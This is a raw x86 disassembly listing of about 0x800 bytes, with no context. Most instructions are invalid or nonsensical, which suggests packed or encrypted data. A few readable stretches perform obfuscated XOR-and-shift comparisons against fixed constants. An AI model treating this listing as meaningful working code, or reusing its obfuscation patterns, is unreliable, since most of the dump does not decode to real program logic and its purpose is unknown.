  407cbe:	(bad)  
  407cbf:	aaa    
  407cc0:	fcomp  DWORD PTR [ecx+0x37]
  407cc3:	popf   
  407cc4:	mov    al,ds:0xf8147361
  407cc9:	mov    ch,0xa
  407ccb:	mov    eax,esi
  407ccd:	div    BYTE PTR [ebp-0x4a]
  407cd0:	lods   al,BYTE PTR ds:[esi]
  407cd1:	call   0x3b032d58
  407cd6:	ds push ecx
  407cd8:	jge    0x407c6b
  407cda:	clc    
  407cdb:	mov    edi,0xd0b548f8
  407ce0:	add    esp,DWORD PTR [ebp-0xcfff569]
  407ce6:	jb     0x407d23
  407ce8:	add    eax,0xb88d055c
  407ced:	push   ds
  407cee:	sbb    BYTE PTR [edx+0x50],0x8b
  407cf2:	(bad)  [edi-0x513b50f4]
  407cf8:	xlat   BYTE PTR ds:[ebx]
  407cf9:	outs   dx,DWORD PTR ds:[esi]
  407cfa:	lods   eax,DWORD PTR ds:[esi]
  407cfb:	je     0x407cf0
  407cfd:	push   ebx
  407cfe:	dec    edx
  407cff:	out    0x60,al
  407d01:	inc    ecx
  407d02:	(bad)  
  407d04:	inc    edi
  407d05:	jp     0x407d02
  407d07:	arpl   WORD PTR [ebp*8+0x3293246b],sp
  407d0e:	int3   
  407d0f:	fisub  DWORD PTR [bx-0x1f]
  407d13:	nop
  407d14:	jnp    0x407d87
  407d16:	sbb    al,0xd7
  407d18:	pop    eax
  407d19:	sub    BYTE PTR [eax+0x4a9cc731],al
  407d1f:	and    ebx,DWORD PTR [edi-0x3b073436]
  407d25:	das    
  407d26:	(bad)  
  407d27:	rol    cl,1
  407d29:	fsubr  DWORD PTR [ebp+0x3e]
  407d2c:	xchg   edx,eax
  407d2d:	mov    ds:0xd691e7c5,eax
  407d32:	daa    
  407d33:	jno    0x407d59
  407d35:	cmp    bl,dl
  407d37:	push   esi
  407d39:	inc    edx
  407d3a:	das    
  407d3b:	sbb    edx,esi
  407d3d:	les    ebp,FWORD PTR [ebp-0x132a7bbc]
  407d43:	mov    edi,0xe1ef6bac
  407d48:	pop    esi
  407d49:	outs   dx,DWORD PTR cs:[esi]
  407d4b:	jle    0x407cdb
  407d4d:	stos   DWORD PTR es:[edi],eax
  407d4e:	addr16 clc 
  407d50:	pop    esi
  407d51:	and    eax,ecx
  407d53:	pop    edx
  407d54:	int    0x5c
  407d56:	mov    ah,0x1e
  407d58:	(bad)  
  407d59:	mov    al,0xef
  407d5b:	or     al,0x92
  407d5d:	popf   
  407d5e:	push   cs
  407d5f:	xchg   ebp,eax
  407d60:	ins    DWORD PTR es:[edi],dx
  407d61:	imul   eax,DWORD PTR [esi+eiz*1-0x4c21d4f5],0x425380ef
  407d6c:	bound  esi,QWORD PTR [ebp+edx*8+0x2e116c5c]
  407d73:	sbb    ecx,0x91d6226e
  407d79:	xlat   BYTE PTR ds:[ebx]
  407d7a:	jle    0x407d8b
  407d7c:	mov    bh,0xe7
  407d7e:	call   0xdf948231
  407d83:	add    DWORD PTR ds:0xe46bd49,edi
  407d89:	mov    ds:0x29c4448c,al
  407d8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d8f:	fwait
  407d90:	and    DWORD PTR [edx+0x44],ebp
  407d93:	jno    0x407dcf
  407d95:	mov    ds:0x5d0068dd,eax
  407d9a:	and    ch,BYTE PTR [edx]
  407d9c:	mov    dl,BYTE PTR [edi+esi*8+0xe4c3145]
  407da3:	inc    ebx
  407da4:	push   esi
  407da5:	and    cl,BYTE PTR [edi+0x72]
  407da8:	hlt    
  407da9:	std    
  407daa:	gs mov edx,0x34810220
  407db0:	or     al,0x9b
  407db2:	mov    eax,ds:0x460d43a4
  407db7:	retf   0xa004
  407dba:	mov    edx,0x45084191
  407dbf:	pusha  
  407dc0:	mov    eax,ecx
  407dc2:	mov    ecx,DWORD PTR [ebp-0x34]
  407dc5:	shrd   ecx,eax,0x2
  407dc9:	shl    edx,0x1e
  407dcc:	xor    edx,0x40000000
  407dd2:	or     edx,DWORD PTR [ebp-0x64]
  407dd5:	mov    DWORD PTR [ebp-0x30],ecx
  407dd8:	mov    ecx,DWORD PTR [esi]
  407dda:	mov    DWORD PTR [ebp-0x5c],ecx
  407ddd:	shl    DWORD PTR [ebp-0x5c],0x1e
  407de1:	xor    DWORD PTR [ebp-0x5c],0x40000000
  407de8:	mov    DWORD PTR [ebp-0x6c],edx
  407deb:	mov    edx,DWORD PTR [esi+0x4]
  407dee:	mov    edx,DWORD PTR [ebp-0x5c]
  407df1:	xor    ecx,ecx
  407df3:	or     ecx,DWORD PTR [ebp-0x30]
  407df6:	shr    eax,0x2
  407df9:	or     edx,eax
  407dfb:	cmp    ecx,DWORD PTR [ebp-0x70]
  407dfe:	jne    0x4071b0
  407e04:	cmp    edx,DWORD PTR [ebp-0x6c]
  407e07:	je     0x40a9b0
  407e0d:	jmp    0x4071b0
  407e12:	mov    ecx,DWORD PTR [ebx]
  407e14:	mov    eax,DWORD PTR [ebx+0x4]
  407e17:	xor    eax,0x9c1b89e8
  407e1c:	xor    ecx,0xca79a577
  407e22:	shrd   ecx,eax,0x2
  407e26:	shr    eax,0x2
  407e29:	mov    DWORD PTR [ebp-0x6c],eax
  407e2c:	mov    eax,DWORD PTR [ebx]
  407e2e:	mov    edx,DWORD PTR [ebx+0x4]
  407e31:	mov    edx,eax
  407e33:	xor    eax,eax
  407e35:	or     eax,ecx
  407e37:	shl    edx,0x1e
  407e3a:	xor    edx,0x40000000
  407e40:	or     edx,DWORD PTR [ebp-0x6c]
  407e43:	mov    DWORD PTR [ebp-0x68],eax
  407e46:	mov    eax,DWORD PTR [esi]
  407e48:	xor    eax,0xca79a577
  407e4d:	mov    DWORD PTR [ebp+0x14],eax
  407e50:	mov    DWORD PTR [ebp-0x64],edx
  407e53:	mov    edx,DWORD PTR [esi+0x4]
  407e56:	mov    ecx,0x9c1b89e8
  407e5b:	xor    edx,ecx
  407e5d:	mov    eax,edx
  407e5f:	mov    edx,DWORD PTR [ebp+0x14]
  407e62:	shrd   edx,eax,0x2
  407e66:	shr    eax,0x2
  407e69:	jmp    0x408247
  407e6e:	push   ss
  407e6f:	dec    esi
  407e70:	dec    ecx
  407e71:	test   BYTE PTR [eax-0x22],0x27
  407e75:	cs aam 0xd8
  407e78:	sbb    eax,0xa121687e
  407e7d:	jo     0x407ea1
  407e7f:	outs   dx,DWORD PTR ds:[esi]
  407e80:	sbb    BYTE PTR [eax],bl
  407e82:	sahf   
  407e83:	adc    bl,BYTE PTR [eax]
  407e85:	sbb    BYTE PTR [esi+0x3f],bh
  407e88:	sub    dh,BYTE PTR [eax]
  407e8a:	mov    edi,ds
  407e8c:	and    DWORD PTR [ebp-0x5fa26a72],eax
  407e92:	dec    esi
  407e93:	sbb    eax,0xd3a10954
  407e98:	cmp    bh,BYTE PTR [edi-0x25]
  407e9b:	out    dx,eax
  407e9c:	xchg   edx,eax
  407e9d:	es pop esi
  407e9f:	in     eax,dx
  407ea0:	mov    DWORD PTR ds:0x39e77a4c,esi
  407ea6:	test   eax,0x3c5c746
  407eab:	push   eax
  407eac:	and    DWORD PTR [edi],edx
  407eae:	sbb    al,0x77
  407eb0:	xchg   ebx,eax
  407eb1:	pop    ds
  407eb2:	loop   0x407e63
  407eb4:	jmp    0x7a0a:0x99e90483
  407ebb:	jo     0x407e73
  407ebd:	(bad)  
  407ebe:	ficomp DWORD PTR [ecx+0x46]
  407ec1:	rol    eax,cl
  407ec3:	shl    DWORD PTR [edi],0x57
  407ec6:	mov    ds:0xef796415,eax
  407ecb:	cmp    DWORD PTR [eax],ebx
  407ecd:	or     ah,BYTE PTR [esi+0x1f]
  407ed0:	sub    ebx,edx
  407ed2:	fdiv   DWORD PTR [ebx]
  407ed4:	mov    ch,0x3f
  407ed6:	popf   
  407ed7:	fist   DWORD PTR [edx+edi*4]
  407eda:	dec    eax
  407edb:	cmp    eax,DWORD PTR [edx]
  407edd:	cld    
  407ede:	xchg   ecx,eax
  407edf:	shr    DWORD PTR [ebp+0x3bc4f911],0x6d
  407ee6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ee7:	cld    
  407ee8:	out    dx,eax
  407ee9:	xchg   ebx,eax
  407eea:	and    ecx,DWORD PTR [eax+0x2b6aa41e]
  407ef0:	out    0x6f,al
  407ef2:	jl     0x407f0f
  407ef4:	jns    0x407f58
  407ef6:	arpl   WORD PTR ds:0x749cd4dd,ax
  407efc:	pop    esp
  407efd:	inc    esp
  407efe:	push   cs
  407eff:	add    dh,BYTE PTR [ebp+0x1a984c05]
  407f05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f06:	push   ebp
  407f07:	or     eax,0xca79bc7b
  407f0c:	iret   
  407f0d:	or     al,0x3c
  407f0f:	add    ecx,DWORD PTR ds:0xeda2a33e
  407f15:	cmp    ebx,DWORD PTR [eax+0x430a518]
  407f1b:	jne    0x407f1b
  407f1d:	sahf   
  407f1e:	sahf   
  407f1f:	daa    
  407f20:	push   esi
  407f21:	dec    ecx
  407f22:	push   eax
  407f23:	js     0x407ef5
  407f25:	std    
  407f26:	sti    
  407f27:	into   
  407f28:	adc    DWORD PTR [ebx+0x29bc9a61],eax
  407f2e:	or     BYTE PTR [edx+0x597d923d],al
  407f34:	jb     0x407f11
  407f36:	mov    edi,0x32c91511
  407f3b:	aaa    
  407f3c:	push   ds
  407f3d:	pop    edi
  407f3e:	ja     0x407f2e
  407f40:	(bad)  
  407f41:	adc    al,BYTE PTR [ecx+ebx*4]
  407f44:	xor    al,0x95
  407f46:	xor    DWORD PTR [ebp+esi*2-0x8],edi
  407f4a:	lds    edi,FWORD PTR [eax]
  407f4c:	imul   al
  407f4e:	nop
  407f4f:	sub    al,BYTE PTR [edi+0x66]
  407f52:	lods   eax,DWORD PTR ds:[esi]
  407f53:	(bad)  
  407f54:	imul   esi,ebp,0xf6d033a9
  407f5a:	das    
  407f5b:	popa   
  407f5c:	int3   
  407f5d:	pop    ss
  407f5e:	loope  0x407ef4
  407f60:	jp     0x407f10
  407f62:	fs pop es
  407f64:	sub    al,0xb1
  407f66:	push   ebx
  407f67:	cmp    ebx,edi
  407f69:	out    dx,eax
  407f6a:	dec    edi
  407f6b:	jmp    0x8b23e8b1
  407f70:	pop    es
  407f71:	jmp    0x407fc0
  407f73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f74:	or     ecx,esp
  407f76:	sar    BYTE PTR [edi],cl
  407f78:	iret   
  407f79:	scas   al,BYTE PTR es:[edi]
  407f7a:	mov    ecx,0x8ea74cc2
  407f7f:	mov    eax,0xe4c64194
  407f84:	push   0xffffffd8
  407f86:	mov    ecx,0xdf3d980
  407f8b:	pop    edx
  407f8c:	mov    ch,0x61
  407f8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f8f:	jne    0x407f46
  407f91:	add    dl,bl
  407f93:	xchg   edi,eax
  407f94:	in     al,dx
  407f95:	or     ebx,DWORD PTR [esi]
  407f97:	jmp    0x407f51
  407f99:	call   0xc38f:0x55e9bfa2
  407fa0:	push   edx
  407fa1:	cs push eax
  407fa3:	sti    
  407fa4:	iret   
  407fa5:	in     eax,dx
  407fa6:	lahf   
  407fa7:	or     dl,BYTE PTR [ecx*4-0x35b0d4c8]
  407fae:	mov    ecx,0x2985da32
  407fb3:	pusha  
  407fb4:	sahf   
  407fb5:	scas   al,BYTE PTR es:[edi]
  407fb6:	or     BYTE PTR [eax-0x41b891b3],dl
  407fbc:	xor    ah,ch
  407fbe:	mov    dh,0xf9
  407fc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407fc1:	xor    cl,bh
  407fc3:	inc    edi
  407fc4:	(bad)  
  407fc5:	repnz adc DWORD PTR [ecx+0x3f26be60],ecx
  407fcc:	into   
  407fcd:	in     al,0x25
  407fcf:	inc    ebp
  407fd0:	pop    ss
  407fd1:	cld    
  407fd2:	jne    0x407f6b
  407fd4:	(bad)
  407fd8:	(bad)  
  407fd9:	mov    BYTE PTR [esi+0x36],bl
  407fdc:	aam    0xf0
  407fde:	add    ebp,DWORD PTR [esp+ebp*1+0x73b678e4]
  407fe5:	out    0x89,al
  407fe7:	fwait
  407fe8:	sbb    al,0x6
  407fea:	ficomp DWORD PTR ds:0xbf521e05
  407ff0:	cs xchg edx,eax
  407ff2:	lea    esp,[edi-0x649fdd39]
  407ff8:	adc    eax,DWORD PTR [esi-0x56]
  407ffb:	je     0x40805e
  407ffd:	sub    esi,DWORD PTR [edx]
  407fff:	push   esp
  408000:	adc    BYTE PTR [edi-0x6f],0x6f
  408004:	mov    dl,0x4d
  408006:	loop   0x407fb3
  408008:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408009:	mov    ecx,0x402253be
  40800e:	in     al,0xef
  408010:	mov    ah,0x71
  408012:	cli    
  408013:	ss cmc 
  408015:	xchg   ebp,eax
  408016:	and    bl,BYTE PTR [ecx+0x2a]
  408019:	jbe    0x407fa1
  40801b:	pop    esp
  40801c:	neg    BYTE PTR [edx+0x578f002d]
  408022:	sti    
  408023:	dec    edi
  408024:	(bad)  
  408025:	fidivr DWORD PTR [edx+0x5]
  408028:	mov    dh,0xbc
  40802a:	lock push eax
  40802c:	and    DWORD PTR es:[eax],ecx
  40802f:	cmovo  esi,DWORD PTR [ecx-0x5705d253]
  408036:	mov    esi,0x4f3e8c22
  40803b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40803c:	int3   
  40803d:	or     edi,DWORD PTR [ebp-0x185c7a55]
  408043:	pop    edi
  408044:	cmc    
  408045:	dec    esi
  408046:	and    DWORD PTR [esi-0x12],ebp
  408049:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40804a:	jle    0x408025
  40804c:	dec    dl
  40804e:	pop    esp
  40804f:	or     DWORD PTR [ecx+eax*1+0x1deb0c4],esp
  408056:	jns    0x4080a9
  408058:	inc    ebp
  408059:	and    DWORD PTR [edi+0x3b5f61de],ebx
  40805f:	dec    ecx
  408060:	cmp    BYTE PTR ds:0x8d5416bc,bl
  408066:	popf   
  408067:	cs ins DWORD PTR es:[edi],dx
  408069:	jecxz  0x4080d7
  40806b:	xor    eax,0x1c0e34df
  408070:	test   al,0xf8
  408072:	jnp    0x40807d
  408074:	jmp    0x4421:0xd2fad8dc
  40807b:	aad    0xdc
  40807d:	test   BYTE PTR [ebp-0x13],ch
  408080:	xor    bh,BYTE PTR [edi]
  408082:	pop    esp
  408083:	cmp    ah,bh
  408085:	jbe    0x40808d
  408087:	or     eax,0xb8deee1c
  40808c:	andps  xmm1,XMMWORD PTR [ebx-0x7e]
  408090:	adc    DWORD PTR [edi],eax
  408092:	aas    
  408093:	cmp    al,0x31
  408095:	cmp    esp,edx
  408097:	in     al,dx
  408098:	adc    BYTE PTR [edx+0x1cf4ebc4],bl
  40809e:	jae    0x408114
  4080a0:	sar    DWORD PTR [eax],1
  4080a2:	xchg   esi,eax
  4080a3:	and    eax,0xe5b0a454
  4080a8:	mov    al,ds:0xc8731086
  4080ad:	push   edi
  4080ae:	test   al,0x61
  4080b0:	test   DWORD PTR [edx],esp
  4080b2:	xrelease xchg BYTE PTR [esi+0x7a],al
  4080b6:	jp     0x408077
  4080b8:	mov    edi,0xd38c649e
  4080bd:	mov    ch,al
  4080bf:	data16 or BYTE PTR fs:[edi-0x3ee600d1],bl
  4080c7:	jns    0x408090
  4080c9:	pushf  
  4080ca:	int3   
  4080cb:	mov    bh,0x5f
  4080cd:	jns    0x4080fa
  4080cf:	sub    bl,ah
  4080d1:	retf   
  4080d2:	ins    DWORD PTR es:[edi],dx
  4080d3:	mov    eax,ds:0xb4123b24
  4080d8:	test   dh,dl
  4080da:	aam    0xc7
  4080dc:	inc    ecx
  4080dd:	lea    ecx,[edi-0x79]
  4080e0:	repz mov bh,0xbe
  4080e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4080e4:	add    DWORD PTR [ecx],ebp
  4080e6:	loopne 0x4080e6
  4080e8:	call   0xd57ddc8b
  4080ed:	(bad)  
  4080ee:	out    0x1b,eax
  4080f0:	adc    BYTE PTR [edi-0x25b09855],dl
  4080f6:	or     al,0xa7
  4080f8:	cmp    al,0xb9
  4080fa:	sbb    eax,0xf4e2f367
  4080ff:	outs   dx,DWORD PTR ds:[esi]
  408100:	inc    eax
  408101:	pop    ss
  408102:	jl     0x4080ea
  408104:	mov    ds:0x5b464301,al
  408109:	aas    
  40810a:	hlt    
  40810b:	(bad)  
  40810d:	fs (bad) 
  408110:	jns    0x4080aa
  408112:	pop    ecx
  408113:	mov    al,ds:0xa420cbc
  408118:	cmp    ebp,edx
  40811a:	pop    edi
  40811b:	push   eax
  40811c:	jmp    0xc3419035
  408121:	into   
  408122:	aaa    
  408123:	cmc    
  408124:	mov    ds:0xad2bb636,eax
  408129:	test   eax,0xa0609330
  40812e:	or     DWORD PTR [ecx],eax
  408130:	stc    
  408131:	mov    ebp,0xb0c5d4bf
  408136:	jmp    0x408165
  408138:	imul   esi,DWORD PTR [edi-0x27],0x4c61912a
  40813f:	fmul   DWORD PTR [edi-0x48]
  408142:	out    0x68,al
  408144:	out    0xc7,al
  408146:	dec    ebx
  408147:	out    0x85,eax
  408149:	call   0x20ded32c
  40814e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40814f:	xlat   BYTE PTR ds:[ebx]
  408150:	gs mov edi,0x69b65c
  408156:	in     eax,dx
  408157:	sar    dl,1
  408159:	int    0x7d
  40815b:	cmp    BYTE PTR [ebp+0x35a9fd54],dl
  408161:	cli    
  408162:	mov    ds:0x5b8308b5,al
  408167:	fldenv [edi+0x27]
  40816a:	sar    BYTE PTR [ebx],1
  40816c:	mov    dl,0xde
  40816e:	ds xchg ebp,eax
  408170:	(bad)  
  408171:	mov    dh,0x8f
  408173:	inc    edx
  408174:	jecxz  0x4081b0
  408176:	dec    ecx
  408177:	sbb    eax,0x28ba4dd3
  40817c:	mov    al,ds:0x636af68d
  408181:	(bad)  
  408182:	push   esi
  408183:	ret    
  408184:	pop    eax
  408185:	out    0x7f,eax
  408187:	mov    edi,0xf4ba3a3d
  40818c:	xor    ebx,DWORD PTR [ecx+edx*8-0x39e4e469]
  408193:	call   0xecb26467
  408198:	mov    al,ds:0x99b63ccc
  40819d:	daa    
  40819e:	jge    0x40818b
  4081a0:	enter  0xe90a,0x15
  4081a4:	mov    dh,0x49
  4081a6:	push   edx
  4081a7:	cwde   
  4081a8:	aad    0xe3
  4081aa:	or     bh,BYTE PTR [ebp+edi*1+0x4]
  4081ae:	xor    dl,ah
  4081b0:	fwait
  4081b1:	dec    edx
  4081b2:	in     eax,dx
  4081b3:	rcl    DWORD PTR [eax+0x43],cl
  4081b6:	add    eax,0xe41c7bf
  4081bb:	jmp    0x4081d5
  4081bd:	retf   
  4081be:	lea    ebx,[edi+0x5fc25ae]
  4081c4:	loope  0x40818c
  4081c6:	aam    0xe
  4081c8:	fist   WORD PTR [edx-0x37e10927]
  4081ce:	fcom   QWORD PTR [edi-0x6a]
  4081d1:	imul   eax,DWORD PTR [edi+0x6b],0x757c485a
  4081d8:	push   0xd98d6f9c
  4081dd:	push   ecx
  4081de:	(bad)  
  4081df:	pop    edx
  4081e0:	sti    
  4081e1:	add    eax,0x98070c48
  4081e6:	jp     0x4081c4
  4081e8:	fnstenv [ebx]
  4081ea:	ret    
  4081eb:	addr16 push ebp
  4081ed:	bound  ecx,QWORD PTR ds:0xd203aa24
  4081f3:	jbe    0x40820f
  4081f5:	push   0x2e131fd1
  4081fa:	fwait
  4081fb:	dec    ebx
  4081fc:	inc    ebx
  4081fd:	xchg   edi,eax
  4081fe:	outs   dx,DWORD PTR ds:[esi]
  4081ff:	xor    ah,bh
  408201:	clc    
  408202:	and    eax,0x3e170d4e
  408207:	mov    esi,0x6b7f14f8
  40820c:	push   edx
  40820d:	mov    eax,ds:0x696b9c35
  408212:	mov    esp,DWORD PTR ds:0x4c55e914
  408218:	ret    0x455d
  40821b:	mov    eax,0x9e8d38ef
  408220:	in     eax,0x7e
  408222:	retf   0x5a15
  408225:	test   BYTE PTR [eax-0x39],ah
  408228:	loop   0x40828c
  40822a:	cwde   
  40822b:	inc    ebx
  40822c:	or     ecx,DWORD PTR [edi]
  40822e:	push   ss
  40822f:	neg    esi
  408231:	inc    esp
  408232:	jo     0x40825c
  408234:	sub    ecx,0x66
  408237:	mov    al,0x59
  408239:	imul   eax,DWORD PTR [ebp+edx*4+0x3e98ccee],0x9c27010e
  408244:	ja     0x408299
  408246:	dec    ebx
  408247:	mov    DWORD PTR [ebp-0x6c],eax
  40824a:	mov    eax,DWORD PTR [esi]
  40824c:	mov    DWORD PTR [ebp+0x14],eax
  40824f:	shl    DWORD PTR [ebp+0x14],0x1e
  408253:	xor    DWORD PTR [ebp+0x14],0x40000000
  40825a:	xor    eax,eax
  40825c:	mov    DWORD PTR [ebp-0x70],edx
  40825f:	or     eax,DWORD PTR [ebp-0x70]
  408262:	mov    edx,DWORD PTR [esi+0x4]
  408265:	mov    DWORD PTR [ebp-0x60],eax
  408268:	mov    eax,DWORD PTR [ebp+0x14]
  40826b:	or     eax,DWORD PTR [ebp-0x6c]
  40826e:	mov    DWORD PTR [ebp-0x5c],eax
  408271:	mov    eax,DWORD PTR [ebp-0x68]
  408274:	cmp    DWORD PTR [ebp-0x60],eax
  408277:	jmp    0x408655
  40827c:	xchg   edx,eax
  40827d:	hlt    
  40827e:	xchg   ebp,eax
  40827f:	addr16 jb 0x4082e9
  408282:	(bad)  
  408283:	in     al,0x70
  408285:	mov    edx,0x9f08709d
  40828a:	aas    
  40828b:	mov    esi,0x181867a8
  408290:	sahf   
  408291:	adc    bl,BYTE PTR [eax]
  408293:	sbb    BYTE PTR [ecx],al
  408295:	inc    ebp
  408296:	mov    ah,0xf6
  408298:	mov    esi,0x23ca726c
  40829d:	mov    dx,si
  4082a0:	shl    DWORD PTR [eax+0x452a2cf],1
  4082a6:	loopne 0x40824b
  4082a8:	lds    edi,FWORD PTR [esi]
  4082aa:	and    ebx,DWORD PTR [edi+0x767aa582]
  4082b0:	int    0xcd
  4082b2:	pop    es
  4082b3:	dec    ebp
  4082b4:	push   ecx
  4082b5:	leave  
  4082b6:	pop    esi
  4082b7:	inc    ebx
  4082b8:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4082ba:	ja     0x4082a3
  4082bc:	shr    BYTE PTR [esi],1
  4082be:	xchg   ebx,eax
  4082bf:	and    eax,DWORD PTR [edx+0x4ccf304f]
  4082c5:	cld    
  4082c6:	sahf   
  4082c7:	dec    ecx
  4082c8:	adc    BYTE PTR [esi+esi*2],bh
  4082cb:	jne    0x40827e
  4082cd:	mov    dh,0xe2
  4082cf:	push   ebp
  4082d0:	jge    0x4082f6
  4082d2:	push   0xffffffaf
  4082d4:	daa    
  4082d5:	inc    ecx
  4082d6:	leave  
  4082d7:	mov    ds:0x65bc3631,al
  4082dc:	aas    
  4082dd:	stc    
  4082de:	in     eax,0xb5
  4082e0:	mov    ah,0x5f
  4082e2:	test   al,0xc0
  4082e4:	sbb    BYTE PTR [esi+0x1e],0xf4
  4082e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4082e9:	loope  0x408351
  4082eb:	add    BYTE PTR [eax],0xd6
  4082ee:	lods   al,BYTE PTR ds:[esi]
  4082ef:	stc    
  4082f0:	scas   eax,DWORD PTR es:[edi]
  4082f1:	imul   ecx,esi,0xa1562efe
  4082f7:	xlat   BYTE PTR ds:[ebx]
  4082f8:	cs mov ecx,0x1ed4bcfc
  4082fe:	sbb    eax,DWORD PTR [eax]
  408300:	xlat   BYTE PTR ds:[ebx]
  408301:	push   ebx
  408302:	mov    dh,0x90
  408304:	jmp    0x4082c9
  408306:	ins    DWORD PTR es:[edi],dx
  408307:	stos   BYTE PTR es:[edi],al
  408308:	cli    
  408309:	or     BYTE PTR [eax-0x1d],0xac
  40830d:	mov    bh,0x5b
  40830f:	jne    0x4082c7
  408311:	bswap  ebx
  408313:	out    dx,al
  408314:	test   al,0xd7
  408316:	(bad)  [edx-0x722a07a1]
  40831c:	push   es
  40831d:	rcr    esp,1
  40831f:	adc    eax,0xb4d46aa7
  408324:	call   0x587f57fb
  408329:	jno    0x408336
  40832b:	inc    eax
  40832c:	ror    DWORD PTR [ebx+0x69],0x48
  408330:	add    al,0x30
  408332:	mov    eax,0xfd685595
  408337:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408338:	dec    esi
  408339:	fdiv   QWORD PTR [esp+ebp*2-0x3e]
  40833d:	loopne 0x40834e
  40833f:	sti    
  408340:	dec    ebp
  408341:	popa   
  408342:	mov    al,0x8d
  408344:	mov    dl,0xed
  408346:	idiv   DWORD PTR [edx-0x44]
  408349:	call   0x489c818b
  40834e:	mov    ch,0x99
  408350:	sti    
  408351:	icebp  
  408352:	ss xchg ecx,eax
  408354:	dec    esi
  408355:	sbb    al,0x6d
  408357:	xor    al,0xe5
  408359:	and    esi,edi
  40835b:	inc    edi
  40835c:	nop
  40835d:	adc    cl,BYTE PTR [eax+0x65]
  408360:	fild   WORD PTR [edi+0x7e]
  408363:	mov    dh,0xb8
  408365:	bound  ecx,QWORD PTR [ebx-0x32aaf8c9]
  40836b:	mov    eax,ds:0xe347636d
  408370:	jne    0x408303
  408372:	mov    cl,0x4f
  408374:	adc    cl,0x47
  408377:	enter  0x8587,0x28
  40837b:	out    0x60,al
  40837d:	lods   al,BYTE PTR ds:[esi]
  40837e:	pop    ds
  40837f:	rcl    edi,cl
  408381:	xor    eax,0x1c203310
  408386:	js     0x408359
  408388:	(bad)  
  40838a:	test   DWORD PTR [edx+0x6a],0xaafa1d77
  408391:	dec    ecx
  408392:	js     0x4083d4
  408394:	jbe    0x408353
  408396:	les    ebx,FWORD PTR [edi+0x51]
  408399:	cdq    
  40839a:	adc    eax,DWORD PTR [edx]
  40839c:	in     al,dx
  40839d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40839e:	add    DWORD PTR [edx+0x64],esp
  4083a1:	aad    0x7
  4083a3:	into   
  4083a4:	mov    es:0x6300ec55,eax
  4083aa:	iret   
  4083ab:	in     eax,0x88
  4083ad:	push   es
  4083ae:	loopne 0x4083ea
  4083b0:	add    DWORD PTR [ebx+0x4a],ecx
  4083b3:	iret   
  4083b4:	daa    
  4083b5:	test   al,0x9c
  4083b7:	lock mov esi,0xabd85088
  4083bd:	inc    esi
  4083be:	into   
  4083bf:	pop    edx
  4083c0:	cli    
  4083c1:	inc    ecx
  4083c2:	adc    dh,BYTE PTR [ecx]
  4083c4:	or     DWORD PTR [eax],0x7f9a97b2
  4083ca:	leave  
  4083cb:	dec    edx
  4083cc:	pop    edx
  4083cd:	das    
  4083ce:	dec    ecx
  4083cf:	int    0x61
  4083d1:	inc    eax
  4083d2:	(bad)  
  4083d3:	jne    0x408453
  4083d5:	out    0x9b,eax
  4083d7:	push   esp
  4083d8:	push   0x59
  4083da:	(bad)  [eax+ecx*8+0x62]
  4083de:	lods   eax,DWORD PTR ds:[esi]
  4083df:	jbe    0x408399
  4083e1:	xchg   edi,eax
  4083e2:	shr    DWORD PTR [ebx],0xb7
  4083e5:	dec    ebp
  4083e6:	and    ch,bl
  4083e8:	mov    ah,BYTE PTR [esp+ebx*1+0x5557b650]
  4083ef:	outs   dx,DWORD PTR ds:[esi]
  4083f0:	std    
  4083f1:	adc    DWORD PTR [ebx],ebx
  4083f3:	enter  0x740a,0x28
  4083f7:	gs repnz ins DWORD PTR es:[edi],dx
  4083fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4083fb:	and    al,0xe8
  4083fd:	mov    dl,0x87
  4083ff:	sbb    DWORD PTR [ebx+0x6b],edx
  408402:	aas    
  408403:	not    bl
  408405:	outs   dx,DWORD PTR ds:[esi]
  408406:	dec    eax
  408407:	icebp  
  408408:	jae    0x408455
  40840a:	stos   BYTE PTR es:[edi],al
  40840b:	mov    ds:0x6a0ed622,al
  408410:	cwde   
  408411:	in     al,dx
  408412:	stc    
  408413:	push   ss
  408414:	jo     0x4083d8
  408416:	(bad)  
  408418:	retf   0xc9b6
  40841b:	cs or  bl,dh
  40841e:	cmp    cl,0x5c
  408421:	pop    edi
  408422:	data16 mov dh,0x6f
  408425:	js     0x40843f
  408427:	std    
  408428:	movq   QWORD PTR ds:0xd2488251,mm0
  40842f:	loopne 0x408411
  408431:	dec    ecx
  408432:	ror    DWORD PTR [edx-0x45],0x9d
  408436:	xchg   BYTE PTR [ebx*8-0x69a47951],ah
  40843d:	add    BYTE PTR [ecx+0x5761dc91],0x15
  408444:	push   ds
  408445:	xchg   edx,eax
  408446:	dec    esp
  408447:	xor    eax,0x1ccf430f
  40844c:	mov    ds:0xc9e17be9,eax
  408451:	in     eax,0x2f
  408453:	xchg   eax,eax
  408455:	sbb    al,ch
  408457:	stos   BYTE PTR es:[edi],al
  408458:	add    al,0x81
  40845a:	jbe    0x4084a3
  40845c:	test   eax,0x24ecb100
  408461:	jmp    0xf8d3:0x4246a7dd
  408468:	mov    ah,dl
  40846a:	les    edi,FWORD PTR [edx+0x6a]
  40846d:	out    dx,al
  40846e:	in     eax,dx
  40846f:	mov    ebx,0x960faa65
  408474:	mov    esi,0x369489ed
  408479:	sub    dh,dh
  40847b:	icebp  
  40847c:	ins    DWORD PTR es:[edi],dx
  40847d:	pop    edx
  40847e:	mov    cl,0x78
  408480:	enter  0x9314,0xcc
  408484:	cs dec eax
  408486:	pop    edx
  408487:	icebp  
  408488:	popa   
  408489:	dec    ebx
  40848a:	xor    al,0x1f
  40848c:	fisub  WORD PTR [edx-0x44]
  40848f:	push   ebx
